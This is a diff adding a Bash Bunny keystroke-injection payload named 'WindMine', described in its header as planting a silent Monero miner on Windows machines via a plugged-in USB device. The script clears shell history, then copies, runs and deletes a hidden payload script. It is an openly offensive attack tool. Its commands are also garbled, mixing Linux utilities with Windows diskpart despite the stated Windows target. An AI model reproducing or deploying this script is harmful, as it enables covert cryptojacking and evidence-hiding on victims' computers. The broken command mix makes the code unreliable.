@@ -1,0 +1,87 @@
+#Title:      	WindMine
+#Description:   creates a silent monero miner on windows computers once pluggged in with the bash bunny.
+#Author:        White_Wid0w 
+#Props: 	?  
+#Version: 	1.0
+#Category: 	Execution
+#Target:	Windows (All Versions)
+#AttackModes: 	Hid, Ethernet. 
+
+
+
+
+
+
+LED SETUP
+ATTACKMODE STORAGE HID
+GET SWITCH_POSITION
+LED ATTACK
+Q DELAY 1000
+Q CTRL-ALT t
+Q DELAY 1000
+
+# [Prevent storing history]
+Q STRING unset HISTFILE
+Q ENTER
+Q DELAY 200
+
+# [Fetching BashBunny's block device]
+Q STRING lol='$(diskpart | grep 1.8G)'
+Q ENTER
+Q DELAY 100
+Q STRING disk='$(echo $lol | awk '\'{print\ '$1'}\'\)''
+Q ENTER
+Q DELAY 200
+
+# [Mounting BashBunny]
+Q STRING udisksctl mount -b /dev/'$disk' c:\tmp
+Q ENTER
+Q DELAY 1400
+Q STRING mntt='$(diskpart | grep $disk | awk '\'{print\ '$7'}\'\)''
+Q ENTER
+Q DELAY 200
+
+# [transfering payload script]
+Q STRING cp -r '$mntt'/payloads/library/windmine/payload.sh /tmp/
+Q ENTER
+Q STRING chmod +x /tmp/payload.sh
+Q ENTER
+Q STRING /tmp/./payload.sh
+Q ENTER
+Q DELAY 1500
+Q STRING rm /tmp/payload.sh
+Q ENTER
+Q DELAY 500
+
+# [Unmounting BashBunny]
+Q STRING udisksctl unmount -b /dev/'$disk'
+Q ENTER
+Q DELAY 500
+Q STRING exit
+Q ENTER
+LED FINISH
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
